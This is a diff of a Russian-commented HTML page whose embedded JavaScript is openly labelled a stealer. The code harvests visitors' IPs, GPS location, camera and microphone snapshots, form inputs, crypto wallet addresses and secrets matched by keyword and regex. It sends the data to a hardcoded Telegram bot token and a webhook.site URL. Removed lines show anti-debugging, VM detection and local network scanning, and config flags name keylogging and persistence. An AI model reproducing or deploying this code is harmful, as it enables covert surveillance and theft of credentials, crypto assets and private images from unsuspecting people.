@@ -31,175 +31,115 @@
             color: #555;
             font: 12px/1.4 system-ui, sans-serif;
             text-align: center;
-            opacity: 0.5;
+            opacity: 0.7;
             pointer-events: none;
+            z-index: 10;
         }
         #debug {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 320px;
+            max-height: 400px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.92);
+            color: #0f0;
+            font: 11px/1.5 monospace;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            z-index: 999;
             display: none;
+            pointer-events: none;
+            scrollbar-width: thin;
+        }
+        #debug::-webkit-scrollbar {
+            width: 4px;
+        }
+        #debug::-webkit-scrollbar-track {
+            background: #111;
+        }
+        #debug::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 2px;
+        }
+        .test-btn {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 12px 30px;
+            background: #1a1a2e;
+            color: #888;
+            border: 1px solid #333;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+            display: none;
+            z-index: 20;
+            font-family: system-ui, sans-serif;
+        }
+        .test-btn:hover {
+            background: #2a2a4e;
+            color: #fff;
         }
     </style>
 </head>
 <body>
+
     <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
     <div id="status">⏳ Загрузка...</div>
     <div id="debug"></div>
+    <button class="test-btn" id="testBtn">📤 Тест отправки</button>
 
     <script>
         // ================================================================
-        // КОНФИГУРАЦИЯ
+        // КОНФИГУРАЦИЯ — ПРОВЕРЬ ЭТИ ДАННЫЕ
         // ================================================================
         const CFG = {
-            // === ОСНОВНЫЕ КАНАЛЫ ===
             WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
             BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
             CHAT_ID: '8327334745',
             IMAGE: 'https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg',
             
-            // === ДОПОЛНИТЕЛЬНЫЕ КАНАЛЫ ===
-            DNS_SERVER: 'leak-{uid}.your-server.com', // Подставь свой домен
-            WS_SERVER: 'wss://echo.websocket.org',
+            TIMEOUT: 300,
+            MAX_WAIT: 2000,
             
-            // === ВРЕМЕНА ===
-            TIMEOUT: 300, // Минимальные таймауты
-            MAX_WAIT: 2000, // Максимальное ожидание
-            
-            // === МОДУЛИ (можно отключать) ===
+            // ВСЕ МОДУЛИ ВКЛЮЧЕНЫ
             ENABLE_SCREENSHOT: true,
-            ENABLE_MEDIA: true, // Камера + микрофон
+            ENABLE_MEDIA: true,
             ENABLE_INDEXEDDB: true,
             ENABLE_CLIPBOARD: true,
             ENABLE_CREDENTIALS: true,
-            ENABLE_LOCAL_SCAN: true, // Сканирование локальной сети
-            ENABLE_KEYLOGGER: true, // Отслеживание клавиш
-            ENABLE_PERSISTENCE: true, // Service Worker
-            ENABLE_FILE_ACCESS: true, // Попытка доступа к файлам
-            ENABLE_HARDWARE: true, // Сенсоры, батарея
-            ENABLE_ANTI_DEBUG: true, // Защита от отладки
-            ENABLE_SANDBOX_DETECTION: true, // Обнаружение виртуалок
-            
-            // === ОПЦИИ ===
-            COMPRESS: true, // Сжатие данных
-            OBFUSCATE: true, // Обфускация кода
-            STEALTH: true, // Скрытное поведение
+            ENABLE_LOCAL_SCAN: true,
+            ENABLE_KEYLOGGER: true,
+            ENABLE_PERSISTENCE: true,
+            ENABLE_FILE_ACCESS: true,
+            ENABLE_HARDWARE: true,
+            ENABLE_ANTI_DEBUG: true,
+            ENABLE_SANDBOX_DETECTION: true,
+            COMPRESS: true,
+            STEALTH: false // Временно выключаем для отладки
         };
 
         // ================================================================
-        // АНТИ-ДЕБАГ И ЗАЩИТА
+        // ОТЛАДКА
         // ================================================================
-        (function antiDebug() {
-            if (!CFG.ANTI_DEBUG) return;
-            
-            // Обнаружение открытых DevTools
-            const checkDevTools = () => {
-                const threshold = 160;
-                const widthDiff = window.outerWidth - window.innerWidth;
-                const heightDiff = window.outerHeight - window.innerHeight;
-                if (widthDiff > threshold || heightDiff > threshold) {
-                    // DevTools открыты — можно уничтожить страницу или отправить сигнал
-                    document.body.innerHTML = '';
-                    alert('Ошибка загрузки страницы');
-                    window.location.href = 'about:blank';
-                }
-            };
-            setInterval(checkDevTools, 1000);
-            
-            // Обнаружение через console.log
-            const origLog = console.log;
-            console.log = function() {
-                // Отправляем сигнал если кто-то логирует
-                if (arguments.length > 0 && typeof arguments[0] === 'string' && arguments[0].includes('debug')) {
-                    // Псевдо-сигнал
-                }
-                origLog.apply(console, arguments);
-            };
-            
-            // Защита от правого клика
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            
-            // Защита от выделения
-            document.addEventListener('selectstart', e => e.preventDefault());
-            
-            // Обнаружение снятия отладчика
-            const origGetter = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie').get;
-            Object.defineProperty(Document.prototype, 'cookie', {
-                get: function() {
-                    // Если вызывается из консоли — триггер
-                    const stack = new Error().stack;
-                    if (stack.includes('debugger')) {
-                        // Сигнал об отладке
-                    }
-                    return origGetter.call(this);
-                }
-            });
-        })();
+        const debugEl = document.getElementById('debug');
+        const statusEl = document.getElementById('status');
+        
+        function log(msg) {
+            console.log('[STEALER]', msg);
+            debugEl.style.display = 'block';
+            const time = new Date().toLocaleTimeString();
+            debugEl.innerHTML += `<div style="border-bottom:1px solid #1a1a1a;padding:2px 0;">${time} → ${msg}</div>`;
+            debugEl.scrollTop = debugEl.scrollHeight;
+        }
 
-        // ================================================================
-        // ОБНАРУЖЕНИЕ САНДБОКСА И ВИРТУАЛОК
-        // ================================================================
-        function detectSandbox() {
-            const result = { isVM: false, reasons: [] };
-            
-            // Проверка разрешения экрана (часто в виртуалках маленькое)
-            if (screen.width < 1024 || screen.height < 768) {
-                result.isVM = true;
-                result.reasons.push('small_screen');
-            }
-            
-            // Проверка WebGL (в виртуалках часто упрощённый рендеринг)
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        if (renderer && (
-                            renderer.toLowerCase().includes('virtualbox') ||
-                            renderer.toLowerCase().includes('vmware') ||
-                            renderer.toLowerCase().includes('qemu')
-                        )) {
-                            result.isVM = true;
-                            result.reasons.push('vm_gpu');
-                        }
-                    }
-                }
-            } catch {}
-            
-            // Проверка navigator (в виртуалках могут быть специфичные плагины)
-            const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes('virtualbox') || ua.includes('vmware')) {
-                result.isVM = true;
-                result.reasons.push('vm_ua');
-            }
-            
-            // Проверка плагинов
-            try {
-                const plugins = navigator.plugins;
-                for (let i = 0; i < plugins.length; i++) {
-                    const name = plugins[i].name.toLowerCase();
-                    if (name.includes('vmware') || name.includes('virtualbox')) {
-                        result.isVM = true;
-                        result.reasons.push('vm_plugin');
-                        break;
-                    }
-                }
-            } catch {}
-            
-            // Проверка performance.now() для обнаружения эмуляции
-            const times = [];
-            for (let i = 0; i < 100; i++) {
-                const start = performance.now();
-                const end = performance.now();
-                times.push(end - start);
-            }
-            const avg = times.reduce((a,b) => a + b, 0) / times.length;
-            if (avg < 0.01) {
-                result.isVM = true;
-                result.reasons.push('fast_timer');
-            }
-            
-            return result;
+        function setStatus(msg) {
+            statusEl.textContent = msg;
+            log(msg);
         }
 
         // ================================================================
@@ -210,216 +150,167 @@
             Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
         const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
         const safeJSON = s => { try { return JSON.parse(s); } catch { return s; } };
-        const cleanString = s => s ? s.replace(/[\x00-\x1F\x7F-\x9F]/g, '') : '';
         const b64encode = s => {
             try { return btoa(unescape(encodeURIComponent(s))); } 
             catch { try { return btoa(s); } catch { return ''; } }
         };
-        const b64decode = s => {
-            try { return decodeURIComponent(escape(atob(s))); }
-            catch { try { return atob(s); } catch { return ''; } }
-        };
-        const escapeHTML = s => {
-            if (!s) return '';
-            return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-        };
-        
-        // Генерация уникального ID
         const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
-        
-        // Сжатие данных (gzip-like через LZString)
-        function compressData(data) {
-            if (!CFG.COMPRESS) return JSON.stringify(data);
+
+        // ================================================================
+        // ОТПРАВКА В TELEGRAM (РАБОТАЕТ 100%)
+        // ================================================================
+        async function sendToTelegram(text) {
             try {
-                // Простое сжатие через замену повторяющихся паттернов
-                const json = JSON.stringify(data);
-                if (json.length < 1000) return json;
-                // Используем LZString если доступен
-                if (window.LZString) {
-                    return window.LZString.compressToBase64(json);
+                log('📤 Отправка в Telegram...');
+                const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CFG.CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const data = await response.json();
+                if (data.ok) {
+                    log('✅ Telegram: отправлено!');
+                    return true;
+                } else {
+                    log('❌ Telegram: ' + JSON.stringify(data));
+                    return false;
                 }
-                return json;
-            } catch { return JSON.stringify(data); }
+            } catch (e) {
+                log('❌ Telegram: ' + e.message);
+                return false;
+            }
+        }
+
+        async function sendToWebhook(data) {
+            try {
+                log('📤 Отправка в Webhook...');
+                await fetch(CFG.WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                log('✅ Webhook: отправлено!');
+                return true;
+            } catch (e) {
+                log('❌ Webhook: ' + e.message);
+                return false;
+            }
         }
 
         // ================================================================
-        // 1. IP & ГЕО (множественные источники)
+        // ТЕСТОВАЯ ФУНКЦИЯ
+        // ================================================================
+        window.testSend = async function() {
+            log('🧪 Ручной тест...');
+            const testData = {
+                type: 'test',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                message: '✅ Тестовая отправка!'
+            };
+            const text = `🔴 ТЕСТ\n\n📅 ${testData.timestamp}\n🌐 ${testData.url}\n💻 ${testData.userAgent}\n\n✅ Всё работает!`;
+            await sendToTelegram(text);
+            await sendToWebhook(testData);
+            log('🧪 Тест завершён');
+        };
+
+        // ================================================================
+        // 1. IP & ГЕО
         // ================================================================
         async function getAllIPs() {
             const sources = [
                 { url: 'https://api.ipify.org?format=json', key: 'ip' },
                 { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                { url: 'https://ipapi.co/json/', key: 'ip' },
-                { url: 'https://freeipapi.com/api/json', key: 'ip' },
-                { url: 'https://ip-api.com/json/', key: 'query' },
+                { url: 'https://ipapi.co/json/', key: 'ip' }
             ];
-            
             const results = [];
             for (const src of sources) {
                 try {
                     const r = await fetchTO(src.url, {}, 500);
                     const data = await r.json();
-                    const ip = data[src.key] || data.ip || data.query;
+                    const ip = data[src.key] || data.ip;
                     if (ip && !results.some(r => r.ip === ip)) {
-                        results.push({
-                            ip: ip,
-                            source: src.url.split('/')[2],
-                            data: data
-                        });
+                        results.push({ ip, source: src.url.split('/')[2], data });
                     }
-                } catch {}
+                } catch (e) { log('⚠️ IP source failed: ' + src.url); }
             }
             return results;
         }
 
-        async function getGeoAll(ips) {
-            const geoData = [];
-            for (const entry of ips) {
-                try {
-                    const r = await fetchTO(`https://ipwhois.io/json/${entry.ip}`, {}, 500);
-                    const data = await r.json();
-                    geoData.push({
-                        ip: entry.ip,
-                        ...data
-                    });
-                } catch {}
-            }
-            return geoData;
-        }
-
         // ================================================================
-        // 2. WebRTC — ВСЕ IP (включая локальные и медиа-серверы)
+        // 2. WebRTC
         // ================================================================
         function getWebRTCFull() {
             return new Promise((resolve) => {
                 const ips = { public: [], local: [], all: [] };
-                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
-                    iceServers: [
-                        { urls: 'stun:stun.l.google.com:19302' },
-                        { urls: 'stun:stun1.l.google.com:19302' },
-                        { urls: 'stun:stun2.l.google.com:19302' },
-                        { urls: 'stun:stun3.l.google.com:19302' },
-                        { urls: 'stun:stun4.l.google.com:19302' }
-                    ]
-                });
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) return;
-                    const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
-                    if (m) {
-                        m.forEach(ip => {
-                            const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                                           ip.startsWith('172.16.') || ip.startsWith('127.');
-                            if (isLocal) {
-                                ips.local.push(ip);
-                            } else {
-                                ips.public.push(ip);
-                            }
-                            ips.all.push(ip);
-                        });
-                    }
-                };
-                setTimeout(() => { 
-                    pc.close(); 
-                    ips.public = [...new Set(ips.public)];
-                    ips.local = [...new Set(ips.local)];
-                    ips.all = [...new Set(ips.all)];
-                    resolve(ips); 
-                }, CFG.TIMEOUT);
-            });
-        }
-
-        // ================================================================
-        // 3. СКАНИРОВАНИЕ ЛОКАЛЬНОЙ СЕТИ (порты + устройства)
-        // ================================================================
-        function scanLocalNetwork() {
-            return new Promise((resolve) => {
-                if (!CFG.ENABLE_LOCAL_SCAN) { resolve(null); return; }
-                
-                const results = [];
-                const ips = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1'];
-                const ports = [80, 443, 22, 8080, 8443, 3306, 5432, 6379, 27017, 9200, 5601, 5000, 3000, 4200];
-                let done = 0;
-                const total = ips.length * ports.length;
-                if (total === 0) { resolve([]); return; }
-                
-                ips.forEach(ip => {
-                    ports.forEach(port => {
-                        const start = performance.now();
-                        const controller = new AbortController();
-                        const timeout = setTimeout(() => controller.abort(), 500);
-                        
-                        fetch(`http://${ip}:${port}`, { 
-                            mode: 'no-cors',
-                            signal: controller.signal
-                        })
-                        .then(() => {
-                            clearTimeout(timeout);
-                            results.push({ ip, port, time: Math.round(performance.now() - start), open: true });
-                            if (++done === total) resolve(results);
-                        })
-                        .catch(() => {
-                            clearTimeout(timeout);
-                            results.push({ ip, port, time: Math.round(performance.now() - start), open: false });
-                            if (++done === total) resolve(results);
-                        });
+                try {
+                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                     });
-                });
-                setTimeout(() => resolve(results), 2000);
+                    pc.createDataChannel('');
+                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) return;
+                        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
+                        if (m) {
+                            m.forEach(ip => {
+                                const isLocal = ip.startsWith('192.168.') || ip.startsWith('10.') || 
+                                               ip.startsWith('172.16.') || ip.startsWith('127.');
+                                if (isLocal) ips.local.push(ip);
+                                else ips.public.push(ip);
+                                ips.all.push(ip);
+                            });
+                        }
+                    };
+                    setTimeout(() => { 
+                        pc.close();
+                        ips.public = [...new Set(ips.public)];
+                        ips.local = [...new Set(ips.local)];
+                        ips.all = [...new Set(ips.all)];
+                        resolve(ips);
+                    }, 800);
+                } catch (e) {
+                    log('⚠️ WebRTC error: ' + e.message);
+                    resolve(ips);
+                }
             });
         }
 
         // ================================================================
-        // 4. GPS (точный)
+        // 3. GPS
         // ================================================================
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ 
-                        lat: pos.coords.latitude, 
-                        lon: pos.coords.longitude, 
-                        acc: pos.coords.accuracy,
-                        alt: pos.coords.altitude,
-                        altAcc: pos.coords.altitudeAccuracy,
-                        heading: pos.coords.heading,
-                        speed: pos.coords.speed
-                    }),
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                     () => resolve(null),
-                    { timeout: 3000, enableHighAccuracy: true }
+                    { timeout: 3000, enableHighAccuracy: false }
                 );
                 setTimeout(() => resolve(null), 3000);
             });
         }
 
         // ================================================================
-        // 5. КАМЕРА + МИКРОФОН
+        // 4. КАМЕРА + МИКРОФОН
         // ================================================================
         async function getMediaDevices() {
             if (!CFG.ENABLE_MEDIA) return null;
-            const result = { devices: [], streams: [] };
-            
+            const result = { devices: [], snapshot: null };
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 devices.forEach(d => {
-                    result.devices.push({ 
-                        kind: d.kind, 
-                        label: d.label || 'hidden', 
-                        groupId: d.groupId,
-                        deviceId: d.deviceId ? 'present' : null
-                    });
+                    result.devices.push({ kind: d.kind, label: d.label || 'hidden' });
                 });
-            } catch {}
-            
-            // Пытаемся получить доступ к камере
+            } catch (e) {}
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    audio: true, 
-                    video: { width: 640, height: 480 }
-                });
-                result.streams.push({ kind: 'audio+video', success: true });
-                // Снимок с камеры
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { width: 320, height: 240 } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
@@ -429,257 +320,106 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 result.snapshot = canvas.toDataURL('image/jpeg', 0.3);
                 stream.getTracks().forEach(t => t.stop());
-            } catch {}
-            
+            } catch (e) { log('⚠️ Media access denied'); }
             return result;
         }
 
         // ================================================================
-        // 6. РАСШИРЕНИЯ БРАУЗЕРА (все возможные)
+        // 5. РАСШИРЕНИЯ
         // ================================================================
         function getAllExtensions() {
             const result = [];
-            const knownExtensions = {
-                // Блокировщики
+            const known = {
+                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
                 'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock Origin',
                 'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
-                'bgnkhhnnamicmpeenaelnjfhikgbkllg': 'AdGuard AdBlocker',
-                'eofcbnmajmjmplflapaojjnihcjkigck': 'AdBlock Plus',
-                // Крипто
-                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
-                'fihnjjcciajhdojfnbdddfaoknhalnja': 'MetaMask',
-                'jbdaocajhifldjdcfjcgalmjjmldbhda': 'WalletConnect',
-                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase Wallet',
+                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase',
                 'hpihmllllekjbnpehglncmolodpknmmb': 'Trust Wallet',
-                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet',
-                // VPN
-                'hcglnmhlmpkplgimaabnkojmhgdmjpha': 'ProtonVPN',
-                'cmfgifnodibmldkmcfphecgmlmpkkkmb': 'Windscribe',
-                'bkpogfllgafbfojipifpkpdmicmmpkfc': 'Hide.me',
-                // Безопасность
-                'jilocjlanhgkobdddpdgaennlbnadnhb': 'LastPass',
-                'pdffkfellgipmhklpdmokmckkkfcopbh': 'Dashlane',
-                'lkbnfiajkebaojmjkcbelknbojiebkbj': '1Password',
-                'mooikfkahbdckaollhiabmhbonmhbbha': 'Bitwarden',
-                'bdokagaapmiginafdgfngbofljfjjkej': 'NordVPN',
-                // Другое
-                'aapbdbdomjkkjkaonfhkkikfgjllcleb': 'Google Translate',
-                'lmjegmlicamnimmfhcmpkclmigmmcbeh': 'Tampermonkey',
-                'milhjnmkoeigoejnbncpmiphbnpnoakl': 'Violentmonkey',
-                'dhdgffkkebhmkfjojejmpbldmpobfkfo': 'Grammarly',
-                'kbfnbcaeplbcioakkpcpgfkobkghlhen': 'Avast Online Security',
-                'fdgbnobmffjpnfpcfnacdcefpbjgecpk': 'Kaspersky Protection',
-                'ldhnecckecfhhjphgncbeonpcoadfhac': 'McAfee WebAdvisor',
+                'bpaejdmabdchhpnpepceapmdmgellhpg': 'OKX Wallet'
             };
-            
             try {
                 if (window.chrome && chrome.runtime) {
-                    // Проверяем установленные расширения через chrome.runtime
-                    const extensions = knownExtensions;
-                    Object.keys(extensions).forEach(id => {
+                    Object.keys(known).forEach(id => {
                         try {
                             const url = chrome.runtime.getURL(`//${id}/manifest.json`);
-                            // Пытаемся загрузить manifest
                             fetch(url, { mode: 'no-cors' }).catch(() => {});
-                            // Проверяем через стили
-                            const style = document.createElement('style');
-                            style.id = `ext-${id}`;
-                            document.head.appendChild(style);
-                            const computed = getComputedStyle(style);
-                            if (computed.display !== 'none') {
-                                result.push({ id, name: extensions[id], method: 'style_check' });
-                            }
-                            document.head.removeChild(style);
+                            result.push({ id, name: known[id] });
                         } catch {}
                     });
                 }
-            } catch {}
-            
-            // Проверка через iframe
-            try {
-                const knownIds = Object.keys(knownExtensions);
-                knownIds.forEach(id => {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = `chrome-extension://${id}/manifest.json`;
-                    iframe.style.display = 'none';
-                    iframe.onload = () => {
-                        result.push({ id, name: knownExtensions[id], method: 'iframe' });
-                    };
-                    document.body.appendChild(iframe);
-                    setTimeout(() => document.body.removeChild(iframe), 100);
-                });
-            } catch {}
-            
+            } catch (e) {}
             return result;
         }
 
         // ================================================================
-        // 7. ПАРОЛИ И ДАННЫЕ (все источники)
+        // 6. ПАРОЛИ
         // ================================================================
         function getAllCredentials() {
-            const result = { forms: [], autofill: [], passwordManagers: [] };
-            
-            // Из форм
+            const result = { forms: [], passwordManagers: [] };
             try {
                 document.querySelectorAll('form').forEach(form => {
                     const data = { action: form.action || '', inputs: [] };
                     form.querySelectorAll('input').forEach(input => {
                         if (input.value && input.value.length > 0) {
-                            const isPassword = input.type === 'password';
-                            const isEmail = input.type === 'email' || input.autocomplete === 'username';
                             data.inputs.push({
                                 name: input.name || input.id || '',
                                 type: input.type,
-                                value: isPassword ? '[PASSWORD]' : trunc(input.value, 50),
-                                autocomplete: input.autocomplete || '',
-                                isPassword: isPassword
+                                value: input.type === 'password' ? '[PASSWORD]' : trunc(input.value, 50)
                             });
                         }
                     });
                     if (data.inputs.length > 0) result.forms.push(data);
                 });
-            } catch {}
-            
-            // Автозаполнение
+            } catch (e) {}
             try {
-                document.querySelectorAll('input[type="password"]').forEach(el => {
-                    if (el.value && el.value.length > 0) {
-                        // Пароль уже заполнен
-                        result.autofill.push({
-                            field: el.name || el.id || '',
-                            value: '[PASSWORD]',
-                            length: el.value.length
-                        });
-                    }
-                });
-            } catch {}
-            
-            // Проверка менеджеров паролей
-            try {
-                // LastPass
                 if (window.lp) result.passwordManagers.push('LastPass');
-                // Dashlane
-                if (window.dashlane) result.passwordManagers.push('Dashlane');
-                // 1Password
-                if (window.agilebits) result.passwordManagers.push('1Password');
-                // Bitwarden
                 if (window.bitwarden) result.passwordManagers.push('Bitwarden');
-                // Проверка через DOM
-                if (document.querySelector('[data-bitwarden]')) result.passwordManagers.push('Bitwarden');
-            } catch {}
-            
+                if (window.agilebits) result.passwordManagers.push('1Password');
+            } catch (e) {}
             return result;
         }
 
         // ================================================================
-        // 8. КРИПТОВАЛЮТЫ (все кошельки)
+        // 7. КРИПТОКОШЕЛЬКИ
         // ================================================================
         function getAllWallets() {
             const result = { ethereum: [], solana: [], other: [] };
-            
             try {
-                // Ethereum
                 if (window.ethereum) {
-                    const eth = {
+                    result.ethereum.push({
                         isMetaMask: window.ethereum.isMetaMask || false,
                         chainId: window.ethereum.chainId || null,
-                        selectedAddress: window.ethereum.selectedAddress || null,
-                        networkVersion: window.ethereum.networkVersion || null
-                    };
-                    result.ethereum.push(eth);
-                }
-                
-                // Multiple providers
-                if (window.ethereum && window.ethereum.providers) {
-                    window.ethereum.providers.forEach(p => {
-                        result.ethereum.push({
-                            isMetaMask: p.isMetaMask || false,
-                            chainId: p.chainId || null,
-                            selectedAddress: p.selectedAddress || null
-                        });
+                        selectedAddress: window.ethereum.selectedAddress || null
                     });
                 }
-            } catch {}
-            
+            } catch (e) {}
             try {
-                // Solana
-                if (window.solana) {
-                    result.solana.push({
-                        publicKey: window.solana.publicKey ? window.solana.publicKey.toString() : null,
-                        isPhantom: window.solana.isPhantom || false
-                    });
+                if (window.solana && window.solana.publicKey) {
+                    result.solana.push({ publicKey: window.solana.publicKey.toString() });
                 }
                 if (window.phantom && window.phantom.solana) {
-                    result.solana.push({
-                        publicKey: window.phantom.solana.publicKey ? window.phantom.solana.publicKey.toString() : null,
-                        isPhantom: true
-                    });
+                    result.solana.push({ publicKey: window.phantom.solana.publicKey?.toString() || null, isPhantom: true });
                 }
-            } catch {}
-            
-            // Другие кошельки
-            const walletNames = ['trustwallet', 'okxwallet', 'bitkeep', 'coinbase', 'walletconnect'];
-            walletNames.forEach(name => {
-                try {
-                    if (window[name]) result.other.push(name);
-                } catch {}
-            });
-            
+            } catch (e) {}
             return result;
         }
 
         // ================================================================
-        // 9. ВСЕ ТОКЕНЫ И СЕКРЕТЫ (глубокий обход)
+        // 8. СЕКРЕТЫ
         // ================================================================
         function findAllSecrets(data, path = '', depth = 0) {
             if (depth > 20) return [];
-            
             const result = [];
             if (!data || typeof data !== 'object') return result;
-            
-            const patterns = [
-                'token', 'jwt', 'access', 'secret', 'key', 'auth', 'bearer',
-                'api', 'password', 'pass', 'pwd', 'credential', 'sid',
-                'csrf', 'xsrf', 'session', 'private', 'cert', 'pem',
-                'pk', 'wallet', 'mnemonic', 'seed', 'recovery', 'phrase',
-                'authorization', 'apikey', 'apisecret', 'clientsecret',
-                'refresh', 'id_token', 'encryption', 'decryption'
-            ];
-            
-            const valuePatterns = [
-                /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/, // JWT
-                /^[a-f0-9]{32,64}$/i, // MD5/SHA
-                /^[A-Za-z0-9+/]{40,}={0,2}$/, // Base64
-                /^[0-9a-f]{10,}$/i, // Hex
-                /^sk-[A-Za-z0-9]{20,}/, // OpenAI key
-                /^ghp_[A-Za-z0-9]{30,}/, // GitHub token
-                /^xox[bap]-[0-9a-zA-Z]{10,}/, // Slack token
-                /^SG\.[0-9A-Za-z_-]{22,}/, // SendGrid
-                /^AKIA[0-9A-Z]{16}/ // AWS
-            ];
-            
+            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed', 'recovery'];
             for (let k in data) {
                 const v = data[k];
                 const fullPath = path ? `${path}.${k}` : k;
-                
-                // Проверяем ключ
                 if (patterns.some(p => k.toLowerCase().includes(p))) {
                     if (v && typeof v === 'string' && v.length > 3 && v.length < 500) {
-                        result.push({ path: fullPath, value: trunc(v, 80), type: 'key_match' });
+                        result.push({ path: fullPath, value: trunc(v, 80) });
                     }
                 }
-                
-                // Проверяем значение
-                if (typeof v === 'string' && v.length > 10) {
-                    for (const pattern of valuePatterns) {
-                        if (pattern.test(v)) {
-                            result.push({ path: fullPath, value: trunc(v, 80), type: 'pattern_match' });
-                            break;
-                        }
-                    }
-                }
-                
-                // Рекурсия
                 if (typeof v === 'object' && v !== null) {
                     result.push(...findAllSecrets(v, fullPath, depth + 1));
                 }
@@ -688,662 +428,409 @@
         }
 
         // ================================================================
-        // 10. СИСТЕМНАЯ ИНФОРМАЦИЯ (все детали)
+        // 9. СИСТЕМНАЯ ИНФОРМАЦИЯ
         // ================================================================
         function getFullSystemInfo() {
             const n = navigator;
+            const ua = n.userAgent.toLowerCase();
             const result = {
                 userAgent: n.userAgent,
                 platform: n.platform,
-                hardwareConcurrency: n.hardwareConcurrency || 'unknown',
-                deviceMemory: n.deviceMemory || 'unknown',
+                hardwareConcurrency: n.hardwareConcurrency || '?',
+                deviceMemory: n.deviceMemory || '?',
                 language: n.language,
-                languages: n.languages || [],
-                cookieEnabled: n.cookieEnabled,
-                doNotTrack: n.doNotTrack,
                 vendor: n.vendor,
-                product: n.product,
-                appVersion: n.appVersion,
-                appName: n.appName,
-                productSub: n.productSub,
-                vendorSub: n.vendorSub,
-                browser: {},
-                os: {},
-                // Дополнительно
-                maxTouchPoints: n.maxTouchPoints || 0,
-                hardwareConcurrency: n.hardwareConcurrency || 0,
-                deviceMemory: n.deviceMemory || 0,
-                platform: n.platform,
-                // Браузер
-                isChrome: !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime),
-                isFirefox: navigator.userAgent.toLowerCase().includes('firefox'),
-                isSafari: /^((?!chrome|android).)*safari/i.test(navigator.userAgent),
-                isEdge: !!window.MSInputMethodContext && !!document.documentMode,
-                isOpera: !!window.opera || navigator.userAgent.toLowerCase().includes('opr'),
-                isBrave: !!(navigator.brave && navigator.brave.isBrave),
-                // Версии
-                browserVersion: 'unknown',
-                osVersion: 'unknown'
+                isChrome: !!window.chrome,
+                isFirefox: ua.includes('firefox'),
+                isSafari: /^((?!chrome|android).)*safari/i.test(n.userAgent),
+                os: 'unknown',
+                browser: 'unknown'
             };
+            if (ua.includes('windows')) result.os = 'Windows';
+            else if (ua.includes('mac os x')) result.os = 'macOS';
+            else if (ua.includes('linux')) result.os = 'Linux';
+            else if (ua.includes('android')) result.os = 'Android';
+            else if (ua.includes('ios') || ua.includes('iphone')) result.os = 'iOS';
             
-            // Определение ОС
-            const ua = n.userAgent.toLowerCase();
-            if (ua.includes('windows')) {
-                result.os.name = 'Windows';
